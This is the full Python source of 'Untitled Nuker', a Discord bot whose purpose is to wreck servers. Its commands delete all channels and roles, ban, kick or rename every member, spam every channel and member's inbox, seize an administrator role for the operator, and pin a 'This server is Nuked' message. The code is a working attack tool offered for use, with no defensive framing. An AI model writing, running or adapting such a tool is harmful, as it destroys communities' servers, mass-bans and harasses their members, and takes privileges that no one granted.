import json
import os
import traceback

import colorama
import discord
import requests
from colorama import Fore
from discord.ext import commands

colorama.init()
os.system('cls')

try:
    with open("version.txt") as data:
        version = data.readline()
except FileNotFoundError:
    try:
        with open("../version.txt") as data:
            version = data.readline()
    except FileNotFoundError:
        version = ""

embedColor = 0x5c92ff
colors = {"main": Fore.CYAN,
          "white": Fore.WHITE,
          "red": Fore.RED}
msgs = {"info": f"{colors['white']}[{colors['main']}i{colors['white']}]",
        "+": f"{colors['white']}[{colors['main']}+{colors['white']}]",
        "error": f"{colors['white']}[{colors['red']}e{colors['white']}]",
        "input": f"{colors['white']}{colors['main']}>>{colors['white']}",
        "pressenter": f"{colors['white']}[{colors['main']}i{colors['white']}] Press ENTER to exit"}


async def msg_delete(ctx):
    """
    Trying to delete activation message
    """
    try:
        await ctx.message.delete()
    except:
        print(f"{msgs['error']} Can't delete your message")


def userOrBot():
    """
    Returns True if token belongs to user's account
    Returns False if token belongs to bot's account
    """
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return True
    else:
        return False


def checkVersion():
    """
    Checking for new versions on GitHub
    """
    if version == "":
        return ""
    req = requests.get(
        "https://raw.githubusercontent.com/ICEGXG/UntitledNuker/master/version.txt")
    if req.status_code == requests.codes.ok:
        gitVersion = req.text.rstrip()
        if version == gitVersion:
            return "(Latest)"
        else:
            return "(Update available)"
    else:
        return "(Update check failed)"


def checkActivity(type, text):
    if type == "playing":
        return discord.Game(name=text)
    elif type == "listening":
        return discord.Activity(type=discord.ActivityType.listening, name=text)
    elif type == "watching":
        return discord.Activity(type=discord.ActivityType.watching, name=text)
    else:
        return None


print(f'{colors["main"]}\n\n                  __  __  __   __  ______ __  ______ __      ______  _____     ' + "\n"
      r'                 /\ \/\ \/\ "-.\ \/\__  _/\ \/\__  _/\ \    /\  ___\/\  __-.  ' + "\n"
      r'                 \ \ \_\ \ \ \-.  \/_/\ \\ \ \/_/\ \\ \ \___\ \  __\\ \ \/\ \ ' + "\n"
      r'                  \ \_____\ \_\\"\_\ \ \_\\ \_\ \ \_\\ \_____\ \_____\ \____- ' + "\n"
      r'                   \/_____/\/_/ \/_/  \/_/ \/_/  \/_/ \/_____/\/_____/\/____/ ' + "\n"
      '\n'
      r'                            __   __  __  __  __  __  ______  ______    ' + "\n"
      r'                           /\ "-.\ \/\ \/\ \/\ \/ / /\  ___\/\  == \   ' + "\n"
      r'                           \ \ \-.  \ \ \_\ \ \  _"-\ \  __\\ \  __<   ' + "\n"
      r'                            \ \_\\"\_\ \_____\ \_\ \_\ \_____\ \_\ \_\ ' + "\n"
      r'                             \/_/ \/_/\/_____/\/_/\/_/\/_____/\/_/ /_/ '
      "\n"
      "\n"
      "\n"
      f"{colors['white']}                           Author: {colors['main']}ICE#4449\n"
      f"{colors['white']}                           Version: {colors['main']}{version} {checkVersion()}\n"
      f"{colors['white']}                           GitHub: {colors['main']}https://github.com/ICEGXG/UntitledNuker\n\n{colors['white']}")

"""
Fetching prefix, token and owner ID's from config
If there's no config, requests data from the user and creates it
"""
try:
    with open(f"config.json", encoding='utf8') as data:
        config = json.load(data)
    token = config["token"]
    prefix = config["prefix"]
    owners = config["owners"]
    whiteListBool = config["whitelistbool"]
    activity = config["activity"]
    print(f"{msgs['info']} Loaded config.json")
except FileNotFoundError:
    token = input(f"Paste token {msgs['input']} ")
    prefix = input(f"Paste prefix {msgs['input']} ")
    owners = input(
        f"Paste bot's owner ID (If several use ',') {msgs['input']} ")
    whiteListYesOrNo = input(
        f"Enable whitelisting (y/n) {msgs['input']} ").lower()
    whiteListBool = True if whiteListYesOrNo == "y" else False
    owners = owners.replace(" ", "")
    if "," in owners:
        owners = owners.split(",")
        owners = list(map(int, owners))
    else:
        owners = [int(owners)]
    activity = {"type": "playing",
                "text": f"Untitled Nuker v{version}",
                "isenabled": True}
    config = {
        "token": token,
        "prefix": prefix,
        "owners": owners,
        "whitelistbool": whiteListBool,
        "activity": activity
    }
    with open("config.json", "w") as data:
        json.dump(config, data, indent=2)
    print(f"{msgs['info']} Created config.json")
# shitcode :)
if userOrBot() == True:
    print(f"{msgs['info']} Untitled Nuker doesn't support self bots now, it will likely be added in next versions")
    print(msgs['pressenter'])
    input()
    os._exit(0)

if activity["isenabled"]:
    activityToBot = checkActivity(activity["type"], activity["text"])
else:
    activityToBot = None


bot = commands.Bot(command_prefix=prefix, self_bot=userOrBot(),
                   activity=activityToBot, intents=discord.Intents.all())
bot.remove_command("help")


def isOwner(ctx):
    return ctx.author.id in owners


def isWhitelisted(ctx):
    if whiteListBool:
        return ctx.author.id in owners
    else:
        return True


@bot.event
async def on_ready():
    print(f"\n\n{colors['main']}" + ("═"*75).center(95) + f"\n{colors['white']}" +
          f"Logged in as {bot.user}".center(95) + "\n" +
          f"Prefix: {bot.command_prefix}".center(95) + "\n" +
          f"Total servers: {len(bot.guilds)}".center(95) + "\n" +
          f"Total members: {len(bot.users)} ".center(95) + f"\n{colors['main']}" + ("═"*75).center(95) + f"\n\n{colors['white']}")


@bot.event
async def on_command(ctx):
    print(
        f"{msgs['info']} Executed {ctx.command} ({colors['main']}{ctx.message.author}{colors['white']})")


@bot.event
async def on_command_error(ctx, err):
    errors = commands.errors
    if (isinstance(err, errors.BadArgument) or isinstance(err, commands.MissingRequiredArgument)
            or isinstance(err, errors.PrivateMessageOnly) or isinstance(err, errors.CheckFailure)
            or isinstance(err, errors.CommandNotFound)):
        return
    elif isinstance(err, errors.MissingPermissions):
        print(f"{msgs['error']} Missing permissions")
    else:
        print(
            f'{colors["red"]}\n\n{"".join(traceback.format_exception(type(err), err, err.__traceback__))}{colors["white"]}\n')


@bot.command(name='help')
@commands.check(isWhitelisted)
async def help(ctx):
    await msg_delete(ctx)
    p = bot.command_prefix
    embed = discord.Embed(title="Help", color=embedColor)
    embed.set_author(name="Untitled Nuker",
                     url="https://github.com/ICEGXG/UntitledNuker")
    embed.add_field(
        name="Nuke", value=f">>> `{p}1 <ban 1/0> <your text>`", inline=False)
    embed.add_field(name="Ban everyone", value=f">>> `{p}2`", inline=False)
    embed.add_field(name="Kick everyone", value=f">>> `{p}3`", inline=False)
    embed.add_field(name="Rename everyone",
                    value=f">>> `{p}4 <new nickname>`", inline=False)
    embed.add_field(name="DM everyone",
                    value=f">>> `{p}5 <message>`", inline=False)
    embed.add_field(name="Spam to all channels",
                    value=f">>> `{p}6 <amount> <text>`", inline=False)
    embed.add_field(name="Spam to current channel",
                    value=f">>> `{p}7 <amount> <text>`", inline=False)
    embed.add_field(name="Delete all channels",
                    value=f">>> `{p}8`", inline=True)
    embed.add_field(name="Delete all roles", value=f">>> `{p}9`", inline=True)
    embed.add_field(name="\u200b", value="\u200b", inline=True)
    embed.add_field(name="Spam with channels",
                    value=f">>> `{p}10 <amount> <name>`", inline=True)
    embed.add_field(name="Spam with roles",
                    value=f">>> `{p}11 <amount> <name>`", inline=True)
    embed.add_field(name="\u200b", value="\u200b", inline=True)
    embed.add_field(name="Edit server icon",
                    value=f">>> Image is attachment\n`{p}12`", inline=True)
    embed.add_field(name="Edit server name",
                    value=f">>> `{p}13 <name>`", inline=True)
    embed.add_field(name="Get admin",
                    value=f">>> `{p}14 <name of role>`", inline=False)
    # embed.add_field(name="\u200b", value="\u200b", inline=True)
    embed.add_field(
        name="Revive (DM Only)", value=f">>> Creating 1 text channel on server if you deleted all\n`{p}15 <guild id>`", inline=False)
    embed.add_field(name="Settings", value=f">>> `{p}settings`")
    embed.add_field(name="\u200b\nInfo",
                    value=f">>> **Untitled Nuker**\nMade by <@404323086561837066>\nVersion: {version} {checkVersion()}\nGitHub: https://github.com/ICEGXG/UntitledNuker\n", inline=False)
    await ctx.message.author.send(embed=embed)


@bot.group(name='settings', aliases=["config"], invoke_without_command=True)
@commands.check(isWhitelisted)
async def settings(ctx):
    p = bot.command_prefix
    embed = discord.Embed(
        title="Settings", description="Available settings\n`Only for owners`", color=embedColor)
    embed.set_author(name="Untitled Nuker",
                     url="https://github.com/ICEGXG/UntitledNuker")
    embed.add_field(
        name="Prefix", value=f">>> Change prefix\n`{p}settings prefix <prefix>`", inline=False)
    embed.add_field(
        name="Owners", value=f">>> Add or remove user from owners\n`{p}settings owners <add/remove> <ID/mention>`", inline=False)
    embed.add_field(
        name="Whitelist", value=f">>> Enable or disable whitelisting\n`{p}settings whitelist <on/off>`", inline=True)
    embed.add_field(
        name="Activity", value=f">>> Change or disable activity\nAvailable types: `playing`, `listening`, `watching`\n`{p}settings activity <set/off> <type> <text>`", inline=False)
    await ctx.message.author.send(embed=embed)


@settings.command(name='prefix')
@commands.check(isOwner)
async def settingsPrefix(ctx, newPrefix):
    global config
    bot.command_prefix = newPrefix
    config['prefix'] = newPrefix
    with open("config.json", "w") as data:
        json.dump(config, data, indent=2)
    await ctx.message.add_reaction('✅')
    print(
        f"{msgs['info']} Prefix is {colors['main']}{newPrefix}{colors['white']} now")


@settings.command(name='owners')
@commands.check(isOwner)
async def settingOwners(ctx, action, *, users):
    global config
    users = users.replace('<@!', '')
    users = users.replace('>', '')
    users = users.replace(" ", "")
    if "," in users:
        users = users.split(",")
        users = list(map(int, users))
    else:
        users = [int(users)]
    if action == "add":
        config["owners"] += users
        with open("config.json", "w") as data:
            json.dump(config, data, indent=2)
        print(
            f"{msgs['info']} Added {colors['main']}{str(users)[1:-1]}{colors['white']} to owners")
        await ctx.message.add_reaction('✅')
    elif action == "remove" or "delete":
        for user in users:
            config["owners"].remove(user)
        with open("config.json", "w") as data:
            json.dump(config, data, indent=2)
        print(
            f"{msgs['info']} Removed {colors['main']}{str(users)[1:-1]}{colors['white']} from owners")
        await ctx.message.add_reaction('✅')
    else:
        await ctx.message.add_reaction('❌')


@settings.command(name='whitelist', aliases=["whitelisting"])
@commands.check(isOwner)
async def settingsWhitelist(ctx, action):
    global config
    global whiteListBool
    if action.lower() == "on" or "enable":
        whiteListBool = True
        config["whitelistbool"] = True
        with open("config.json", "w") as data:
            json.dump(config, data, indent=2)
        print(f"{msgs['info']} Enabled whitelisting")
        await ctx.message.add_reaction('✅')
    elif action.lower() == "off" or "disable":
        whiteListBool = False
        config["whitelistbool"] = False
        with open("config.json", "w") as data:
            json.dump(config, data, indent=2)
        print(f"{msgs['info']} Disabled whitelisting")
        await ctx.message.add_reaction('✅')
    else:
        await ctx.message.add_reaction('❌')


@settings.command(name='activity')
@commands.check(isOwner)
async def settingsActivity(ctx, action, activityType="playing", *, text=f"Untitled Nuker v{version}"):
    global config
    global activity
    if action == "set":
        await bot.change_presence(activity=checkActivity(activityType, text))
        activity = {"type": activityType,
                    "text": text,
                    "isenabled": True}
        config["activity"] = activity
        with open("config.json", "w") as data:
            json.dump(config, data, indent=2)
        print(f"{msgs['info']} Changed activity")
        await ctx.message.add_reaction('✅')
    elif action == "on" or action == "enable":
        await bot.change_presence(activity=checkActivity(activity["type"], activity["text"]))
        activity["isenabled"] = True
        config["activity"] = activity
        with open("config.json", "w") as data:
            json.dump(config, data, indent=2)
        print(f"{msgs['info']} Enabled activity")
        await ctx.message.add_reaction('✅')
    elif action == "off" or action == "disable":
        await bot.change_presence(activity=None)
        activity["isenabled"] = False
        config["activity"] = activity
        with open("config.json", "w") as data:
            json.dump(config, data, indent=2)
        print(f"{msgs['info']} Disabled activity")
        await ctx.message.add_reaction('✅')
    else:
        await ctx.message.add_reaction('❌')


@bot.command(name='1', aliases=["nk", "nuke"])
@commands.check(isWhitelisted)
async def nuke(ctx, ban: bool = True, text: str = "Untitled Nuker"):
    await msg_delete(ctx)

    """
    Trying to change server icon and name
    """

    icon = await ctx.message.attachments[0].read() if ctx.message.attachments else None
    await ctx.guild.edit(name=text, icon=icon, banner=icon)

    """
    Trying to delete all channels
    """

    for ch in ctx.guild.channels:
        try:
            await ch.delete()
            print(f"{msgs['+']} Deleted {ch}")
        except:
            print(f"{msgs['error']} Can't delete {ch}")

    """
    Trying to ban everyone if requested
    """

    if ban:
        for m in ctx.guild.members:
            if m.id not in owners:
                try:
                    await m.ban()
                    print(f"{msgs['+']} Banned {m}")
                except:
                    print(f"{msgs['error']} can't ban {m}")
            else:
                print(f"{msgs['info']} {m} is owner")

    """
    Trying to delete roles
    """

    for r in ctx.guild.roles:
        try:
            await r.delete()
            print(f"{msgs['+']} Deleted {r}")
        except:
            print(f"{msgs['error']} Can't delete {r}")

    try:
        embed = discord.Embed(color=embedColor)
        embed.add_field(name="This server is Nuked",
                        value="By Unitled Nuker\nDownload: https://github.com/ICEGXG/UntitledNuker", inline=False)
        channel = await ctx.guild.create_text_channel(name="Untitled Nuker")
        message = await channel.send(embed=embed)
        await message.pin()
    except:
        pass


@bot.command(name='2', aliases=["be", "baneveryone"])
@commands.check(isWhitelisted)
async def banEveryone(ctx):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        if m.id not in owners:
            try:
                await m.ban()
                print(f"{msgs['+']} Banned {m}")
            except:
                print(f"{msgs['error']} can't ban {m}")
        else:
            print(f"{msgs['info']} {m} is owner")


@bot.command(name='3', aliases=["ke", "kickeveryone"])
@commands.check(isWhitelisted)
async def kickEveryone(ctx):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        if m.id not in owners:
            try:
                await m.kick()
                print(f"{msgs['+']} Kicked {m}")
            except:
                print(f"{msgs['error']} can't kick {m}")
        else:
            print(f"{msgs['info']} {m} is owner")


@bot.command(name="4", aliases=["chen"])
@commands.check(isWhitelisted)
async def renameEveryone(ctx, *, name="Untitled Nuker"):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        if m.id not in owners:
            try:
                await m.edit(nick=name)
                print(f"{msgs['+']} Changed {m}'s nickname")
            except:
                print(f"{msgs['error']} Can't change {m}'s nickname")
        else:
            print(f"{msgs['info']} {m.name} is owner")


@bot.command(name="5", aliases=["dme"])
@commands.check(isWhitelisted)
async def dmEveryone(ctx, *, msg="Untitled Nuker"):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        if m.id not in owners:
            try:
                await m.send(msg)
                print(f"{msgs['+']} Message sent to {m}")
            except:
                print(f"{msgs['error']} Can't send message to {m}")
        else:
            print(f"{msgs['info']} {m.name} is owner")


@bot.command(name="6", aliases=["sa"])
@commands.check(isWhitelisted)
async def spamToAllChannels(ctx, amount: int = 50, *, text="@everyone Untitled Nuker"):
    await msg_delete(ctx)
    for i in range(amount):
        for ch in ctx.guild.channels:
            try:
                await ch.send(text)
                print(f"{msgs['+']} Message sent to {ch}")
            except:
                print(f"{msgs['error']} Can't send message to {ch}")


@bot.command(name='7', aliases=["sc"])
@commands.check(isWhitelisted)
async def spamToCurrentChannel(ctx, amount: int = 50, *, text="@everyone Untitled Nuker"):
    await msg_delete(ctx)
    for i in range(amount):
        try:
            await ctx.channel.send(text)
            print(f"{msgs['+']} Message sent to {ctx.channel}")
        except:
            print(f"{msgs['error']} Can't send message to {ctx.channel}")


@bot.command(name='8', aliases=["dch"])
@commands.check(isWhitelisted)
async def deleteAllChannels(ctx):
    await msg_delete(ctx)
    for ch in ctx.guild.channels:
        try:
            await ch.delete()
            print(f"{msgs['+']} Deleted {ch}")
        except:
            print(f"{msgs['error']} Can't delete {ch}")


@bot.command(name='9', aliases=["dr"])
@commands.check(isWhitelisted)
async def deleteAllRoles(ctx):
    await msg_delete(ctx)
    for r in ctx.guild.roles:
        try:
            await r.delete()
            print(f"{msgs['+']} Deleted {r}")
        except:
            print(f"{msgs['error']} Can't delete {r}")


@bot.command(name="10", aliases=["sch"])
@commands.check(isWhitelisted)
async def spamWithChannels(ctx, amount: int = 25, *, name="Untitled Nuker"):
    await msg_delete(ctx)
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(name=name)
            print(f"{msgs['+']} Created channel")
        except:
            print(f"{msgs['error']} Can't create channel")


@bot.command(name="11", aliases=["sr"])
@commands.check(isWhitelisted)
async def spamWithRoles(ctx, amount: int = 25, *, name="Untitled Nuker"):
    await msg_delete(ctx)
    for i in range(amount):
        try:
            await ctx.guild.create_role(name=name)
            print(f"{msgs['+']} Created role")
        except:
            print(f"{msgs['error']} Can't create role")


@bot.command(name='12', aliases=["si"])
@commands.check(isWhitelisted)
async def editServerIcon(ctx):
    await msg_delete(ctx)
    if ctx.message.attachments:
        icon = await ctx.message.attachments[0].read()
    else:
        return

    try:
        await ctx.guild.edit(icon=icon)
        print(f"{msgs['+']} Changed server icon")
    except:
        print(f"{msgs['error']} Can't change server icon")


@bot.command(name='13', aliases=["sn"])
@commands.check(isWhitelisted)
async def editServerName(ctx, *, name="Untitled Nuker"):
    await msg_delete(ctx)
    try:
        await ctx.guild.edit(name=name)
        print(f"{msgs['+']} Changed server name")
    except:
        print(f"{msgs['error']} Can't change server name")


@bot.command(name="14", aliases=["ga"])
@commands.check(isWhitelisted)
async def getAdmin(ctx, *, rolename="Untitled Nuker"):
    await msg_delete(ctx)
    try:
        perms = discord.Permissions(administrator=True)
        role = await ctx.guild.create_role(name=rolename, permissions=perms)
        await ctx.message.author.add_roles(role)
        print(f"{msgs['+']} Added admin role to {ctx.message.author}")
    except:
        print(f"{msgs['error']} Can't add admin role to {ctx.message.author}")


@bot.command(name='15', aliases=["rg"])
@commands.check(isWhitelisted)
@commands.dm_only()
async def reviveGuild(ctx, guildId: int = None):
    if guildId:
        guild = bot.get_guild(guildId)
        try:
            await guild.create_text_channel(name="Untitled Nuker")
            print(f"{msgs['+']} Revived {guild}")
        except:
            print(f"{msgs['error']} Can't revive {guild}")


"""
Running bot
"""

try:
    bot.run(token, bot=not userOrBot())
except discord.errors.LoginFailure:
    print(f'{msgs["error"]} Invalid Token')
    print(msgs['pressenter'])
    input()
    os._exit(0)
except discord.errors.PrivilegedIntentsRequired:
    print(f"{msgs['error']} It looks like you didn't enable the necessary intents in the developer portal."
          f"Visit {colors['main']}https://discord.com/developers/applications/ {colors['white']}and turn them on.\n")
    print(msgs['pressenter'])
    input()
    os._exit(0)
except Exception as e:
    print(f'{colors["red"]}\nAn error occured while logging:\n{"".join(traceback.format_exception(type(e), e, e.__traceback__))}{colors["white"]}\n')
    print(msgs['pressenter'])
    input()
    os._exit(0)
